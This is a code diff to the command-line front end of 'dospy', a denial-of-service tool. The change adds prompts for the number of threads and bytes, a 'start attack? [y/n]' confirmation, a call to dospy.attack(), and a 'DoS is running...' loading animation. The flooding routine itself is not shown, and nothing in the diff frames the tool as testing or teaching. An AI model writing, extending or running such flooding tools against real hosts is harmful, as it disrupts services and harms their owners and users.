@@ -2,6 +2,7 @@ import os
 import sys
 
 from .dospy import DosPy
+from .animate import Loader
 
 
 def main():
@@ -21,7 +22,35 @@ def main():
     if result:
         response_time = dospy.check_connection_ms()
         print('\033[32mOK\033[m')
-        print(f'Response time is {response_time:.4f}ms')
+        print(f'Response time is {response_time:.4f}ms\n')
     else:
         print('\033[31mERROR: Could not connect to specified host and port.\033[m')
         sys.exit(1)
+
+    threads_num = input('dospy > Number of threads (default is 100) = ').strip()
+    bytes_num = input('dospy > Number of bytes (default is 1000)  = ').strip()
+
+    if not threads_num:
+        threads_num =  100
+    
+    if not bytes_num:
+        bytes_num = 1000
+
+    dospy.set_config(int(threads_num), int(bytes_num))
+
+    print(f'\nConfigured to create {threads_num} threads, sending {bytes_num} bytes.\n')
+    result = input('dospy > start attack? [y/n] = ').strip().lower()
+
+    if result in ('y', 's'):
+        try:
+            print('\033[1;32m\nStarting attack...', end=' ')
+            dospy.attack()
+            print('OK!\033[m')
+
+            loader = Loader('DoS is running...', '\nThank you.', 0.05).start()
+        except KeyboardInterrupt:
+            loader.stop()
+            sys.exit(0)
+    else:
+        print('\n\033[31mCanceled by user!\033[m')
+        sys.exit(0)
